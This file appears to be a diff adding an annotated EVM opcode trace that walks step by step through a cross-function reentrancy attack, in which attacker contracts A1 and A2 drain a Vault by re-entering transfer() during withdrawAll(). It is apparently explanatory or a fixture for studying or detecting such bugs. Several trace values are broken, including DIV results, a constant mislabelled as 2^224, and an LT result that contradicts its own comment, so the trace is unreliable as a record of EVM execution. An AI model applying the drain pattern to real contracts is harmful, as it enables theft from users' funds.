@@ -1,0 +1,417 @@
+===============================================================================
+CONTRACT 1: Vault.withdrawAll() - Depth 1, Call Number 0
+===============================================================================
+This is the main vulnerable function that reads user balance and sends ETH.
+The vulnerability: it makes an external call BEFORE resetting the balance.
+===============================================================================
+
+0;PUSH1;0
+    PC=0 signals start of new contract (depth becomes 1)
+    Push 0 onto stack for function dispatch
+
+2;CALLDATALOAD;2235212214
+    Load first 32 bytes of calldata (contains function selector)
+    Value: 0x853828b6 = withdrawAll() function selector
+
+6;PUSH29;452312848583266388373324160190187140051835877600158453279131187530910662655
+    Push large number (2^224) to extract selector from calldata
+
+36;SWAP1;2235212214
+    Swap top two stack items to prepare for division
+
+37;DIV;8
+    Divide to shift right and extract function selector bytes
+
+38;PUSH4;2235212214
+    Push withdrawAll() selector (0x853828b6) for comparison
+
+43;EQ;1
+    Check if calldata selector equals withdrawAll selector
+    Result: 1 (true)
+
+44;PUSH2;100
+    Push jump destination (location 100)
+
+47;JUMPI;
+    Conditional jump: if selector matches, jump to location 100
+
+100;JUMPDEST;
+    Jump destination marker - withdrawAll() function starts here
+
+101;PUSH1;0
+    Push storage slot 0 (userBalances mapping base)
+
+103;SLOAD;1000000000000000000
+    ⚠️ CRITICAL: Read userBalances[msg.sender]
+    Returns: 1000000000000000000 (1 ETH in wei)
+    This is the value that will become stale during reentrancy!
+
+104;DUP1;1000000000000000000
+    Duplicate the balance on stack (for later use)
+
+105;PUSH1;0
+    Push 0 for comparison
+
+107;GT;1
+    Check if balance > 0
+    Result: 1 (true, balance is 1 ETH)
+
+108;PUSH2;150
+    Push jump destination
+
+111;JUMPI;
+    Jump if balance > 0 (condition passed)
+
+150;JUMPDEST;
+    Continue execution after balance check
+
+151;PUSH1;0
+    Push 0 (return data offset)
+
+153;DUP1;0
+    Duplicate 0 (return data size)
+
+154;DUP1;0
+    Duplicate 0 (args size)
+
+155;DUP1;0
+    Duplicate 0 (args offset)
+
+156;DUP5;1000000000000000000
+    Push balance value (1 ETH) - amount to send
+
+157;PUSH20;2863311530
+    Push target address (A1 attacker contract)
+    This is where we'll send the ETH
+
+178;GAS;500000
+    Get available gas for the call
+
+179;CALL;1
+    ⚠️ CRITICAL: External call to A1 with 1 ETH
+    This triggers A1.receive() and enables reentrancy!
+    Format: CALL(gas, address, value, argsOffset, argsSize, retOffset, retSize)
+    Returns: 1 (success)
+
+180;POP;
+    Remove call result from stack
+
+181;PUSH1;0
+    Push 0 (value to store)
+
+183;PUSH1;0
+    Push storage slot 0 (userBalances)
+
+185;SSTORE;
+    ⚠️ TOO LATE: Set userBalances[msg.sender] = 0
+    This happens AFTER the reentrancy, so the damage is already done!
+
+186;STOP;
+    End execution of withdrawAll()
+
+===============================================================================
+CONTRACT 2: A1.receive() - Depth 2, Call Number 1
+===============================================================================
+This is the attacker's receive function, triggered when A1 receives ETH.
+It re-enters the vault by calling transfer() to move credits.
+===============================================================================
+
+0;PUSH1;96
+    PC=0 signals start of new contract (depth becomes 2)
+    Push 96 (0x60) for memory setup
+
+2;PUSH1;64
+    Push 64 (0x40) - free memory pointer location
+
+4;MSTORE;
+    Store 96 at memory position 64 (initialize free memory pointer)
+
+5;PUSH1;4
+    Push 4 (size of function selector)
+
+7;CALLDATASIZE;0
+    Get size of calldata
+    Returns: 0 (receive() has no calldata)
+
+8;LT;0
+    Check if 4 < 0 (false)
+
+9;PUSH2;1050
+    Push jump destination
+
+12;JUMPI;
+    Jump if condition is true (skipped here)
+
+1050;JUMPDEST;
+    Continue execution in receive()
+
+1051;PUSH20;3149642683
+    Push vault address (where we'll check balance)
+
+1072;BALANCE;10000000000000000000
+    Get vault's ETH balance
+    Returns: 10 ETH (vault still has funds to steal!)
+
+1073;PUSH18;1000000000000000000
+    Push 1 ETH (threshold for continuing attack)
+
+1092;DUP2;10000000000000000000
+    Duplicate vault balance
+
+1093;LT;0
+    Check if 1 ETH < 10 ETH (true, vault has enough)
+
+1094;PUSH2;1150
+    Push jump destination
+
+1097;JUMPI;
+    Jump if vault has sufficient balance
+
+1150;JUMPDEST;
+    Continue with reentrancy attack
+
+1151;PUSH1;0
+    Push storage slot 0
+
+1153;SLOAD;1000000000000000000
+    ⚠️ CRITICAL: Read userBalances[A1] from vault storage
+    Returns: 1 ETH - this is still 1 ETH because withdrawAll() hasn't
+    reset it yet! This is the KEY to the attack.
+
+1154;PUSH1;100
+    Push 100 (size for calldata)
+
+1156;PUSH1;0
+    Push 0 (memory offset)
+
+1158;MSTORE;
+    Store in memory
+
+1159;PUSH4;2868903851
+    Push transfer(address,uint256) function selector
+    Selector: 0xab3e2115
+
+1164;PUSH1;4
+    Push offset 4 in calldata
+
+1166;MSTORE;
+    Store selector at memory[4]
+
+1167;PUSH20;3435973836
+    Push A2 address (target of transfer - the other attacker contract)
+    This is where we'll transfer our internal credit
+
+1188;PUSH1;36
+    Push offset 36
+
+1190;MSTORE;
+    Store A2 address in calldata
+
+1191;DUP1;1000000000000000000
+    Duplicate balance amount (1 ETH to transfer)
+
+1192;PUSH1;68
+    Push offset 68
+
+1194;MSTORE;
+    Store amount in calldata
+
+1195;PUSH1;0
+    Push 0 (return data offset)
+
+1197;PUSH1;0
+    Push 0 (return data size)
+
+1199;PUSH1;100
+    Push 100 (calldata size)
+
+1201;PUSH1;0
+    Push 0 (calldata offset)
+
+1203;PUSH1;0
+    Push 0 (value - no ETH sent)
+
+1205;PUSH20;3149642683
+    Push vault address (target of call)
+
+1226;GAS;500000
+    Get available gas
+
+1227;CALL;1
+    ⚠️ CRITICAL REENTRANCY: Call Vault.transfer(A2, 1 ETH)
+    This is the CROSS-FUNCTION reentrancy!
+    We're calling transfer() while withdrawAll() is still running
+    Returns: 1 (success)
+
+1228;POP;
+    Remove call result
+
+1229;STOP;
+    End receive() execution
+
+===============================================================================
+CONTRACT 3: Vault.transfer() - Depth 3, Call Number 2
+===============================================================================
+This is the second vault function, called during the reentrancy.
+It's NOT protected by noReentrant modifier - this is the vulnerability!
+It modifies userBalances while withdrawAll() is still executing.
+===============================================================================
+
+0;PUSH1;0
+    PC=0 signals start of new contract (depth becomes 3)
+    Push 0 for function dispatch
+
+2;CALLDATALOAD;2868903851
+    Load calldata (contains transfer selector and arguments)
+    Selector: 0xab3e2115
+
+6;PUSH29;452312848583266388373324160190187140051835877600158453279131187530910662655
+    Push 2^224 for selector extraction
+
+36;SWAP1;2868903851
+    Swap for division
+
+37;DIV;11
+    Divide to extract selector
+
+38;PUSH4;2868903851
+    Push transfer() selector for comparison
+
+43;EQ;1
+    Check if selector matches transfer()
+    Result: 1 (true)
+
+44;PUSH2;2100
+    Push jump destination
+
+47;JUMPI;
+    Jump to transfer() function
+
+2100;JUMPDEST;
+    Transfer function starts here
+
+2101;PUSH1;4
+    Push offset 4 (first argument position)
+
+2103;CALLDATALOAD;3435973836
+    Load _to parameter (A2 address)
+
+2107;PUSH1;36
+    Push offset 36 (second argument position)
+
+2109;CALLDATALOAD;1000000000000000000
+    Load _amount parameter (1 ETH)
+
+2113;PUSH1;0
+    Push storage slot 0 (userBalances base)
+
+2115;SLOAD;1000000000000000000
+    Read userBalances[msg.sender] = userBalances[A1]
+    Returns: 1 ETH (still available!)
+
+2116;DUP1;1000000000000000000
+    Duplicate balance
+
+2117;DUP4;1000000000000000000
+    Duplicate amount (1 ETH)
+
+2118;LT;0
+    Check if balance >= amount
+    Result: 0 (false, they're equal, so transfer is valid)
+
+2119;PUSH2;2200
+    Push jump destination
+
+2122;JUMPI;
+    Jump if condition passed
+
+2200;JUMPDEST;
+    Continue with transfer logic
+
+2201;DUP3;3435973836
+    Push A2 address (recipient)
+
+2202;PUSH32;1
+    Push storage slot 1 (userBalances[A2] location)
+
+2235;SLOAD;0
+    Read userBalances[A2]
+    Returns: 0 (A2 has no balance yet)
+
+2236;DUP4;1000000000000000000
+    Push transfer amount (1 ETH)
+
+2237;ADD;1000000000000000000
+    Add: 0 + 1 ETH = 1 ETH
+
+2238;PUSH32;1
+    Push storage slot 1
+
+2271;SSTORE;
+    ⚠️ CRITICAL VULNERABILITY: Write userBalances[A2] = 1 ETH
+    This modifies state while withdrawAll() is still executing!
+    Now A2 has 1 ETH internal credit
+
+2272;PUSH1;0
+    Push storage slot 0
+
+2274;SLOAD;1000000000000000000
+    Read userBalances[A1] again (still 1 ETH)
+
+2275;DUP4;1000000000000000000
+    Push transfer amount
+
+2276;SWAP1;1000000000000000000
+    Swap for subtraction
+
+2277;SUB;0
+    Subtract: 1 ETH - 1 ETH = 0
+
+2278;PUSH1;0
+    Push storage slot 0
+
+2280;SSTORE;
+    ⚠️ CRITICAL VULNERABILITY: Write userBalances[A1] = 0
+    This is the state modification that breaks withdrawAll()!
+    Now A1 has 0 balance, but withdrawAll() still thinks it's 1 ETH
+
+2281;POP;
+    Clean up stack
+
+2282;POP;
+    Clean up stack
+
+2283;STOP;
+    End transfer() execution
+    Control returns to A1.receive(), then back to withdrawAll()
+
+===============================================================================
+ATTACK SUMMARY
+===============================================================================
+
+Timeline:
+1. [Depth 1] withdrawAll() reads userBalances[A1] = 1 ETH (location 103)
+2. [Depth 1] withdrawAll() sends 1 ETH to A1 (location 179)
+3. [Depth 2] A1.receive() is triggered by ETH transfer
+4. [Depth 2] A1 reads userBalances[A1] = still 1 ETH! (location 1153)
+5. [Depth 2] A1 calls Vault.transfer(A2, 1 ETH) (location 1227)
+6. [Depth 3] transfer() modifies userBalances:
+   - userBalances[A2] = 1 ETH (location 2271) ⚠️
+   - userBalances[A1] = 0 ETH (location 2280) ⚠️
+7. [Depth 2] A1.receive() completes
+8. [Depth 1] withdrawAll() resumes and sets userBalances[A1] = 0 (redundant)
+
+Result:
+- A1 received 1 ETH externally ✓
+- A2 has 1 ETH internal credit ✓
+- A2 can now call withdrawAll() and get another 1 ETH
+- Repeat until vault is drained!
+
+The Vulnerability:
+- transfer() is NOT protected by noReentrant modifier
+- transfer() modifies state (userBalances) that withdrawAll() already read
+- This is CROSS-FUNCTION reentrancy because two different functions are involved
+- The noReentrant guard on withdrawAll() doesn't protect transfer()
+
+===============================================================================
+
